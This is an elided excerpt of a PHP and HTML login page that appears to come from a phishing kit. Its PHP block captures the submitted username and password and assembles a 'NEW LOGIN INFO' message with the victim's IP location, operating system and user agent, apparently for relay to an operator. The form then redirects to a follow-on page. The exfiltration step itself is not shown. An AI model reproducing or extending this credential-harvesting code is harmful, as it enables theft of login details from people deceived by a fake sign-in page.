...
<head>
    ...
    <?php
            if (isset($_POST['submit'])) {
                ...
                $userid = $_POST['user'];
                $pass = $_POST['pass'];
                $login = urlencode("NEW LOGIN INFO" . "\nLOCATION: " . $ip . "\nOS: " . $user_os . "\nUSER AGENT: " . $agent);
                ...
                <div class="flex md:w-1/8 px-3 justify-center py-10 items-center bg-white">
                    <form onsubmit="window.location.href='./reindex.php';" action="" class="bg-white flex flex-col w-11/12" method="post">
                        ...
                        <label class="inline-flex flex-col py-2">
                            <input type="text" placeholder="Username" name="user" id="user" required class="block justify-center items-center text-base px-4 font-medium border border-gray-600 h-12 shadow-sm focus:outline-none text-gray-600 focus:border-green-800"/>
                        ...
                        <label class="inline-flex flex-col py-2">
                            <input type="text" placeholder="Password" name="pass" id="pass" required class="block justify-center items-center text-base px-4 font-medium border border-gray-600 h-12 shadow-sm focus:outline-none text-gray-600 focus:border-green-800"/>
                            <!--<p class="mt-2 invisible peer-invalid:visible text-pink-600 text-sm">
                                Please provide a valid email address.
                            </p>-->
                        </label>
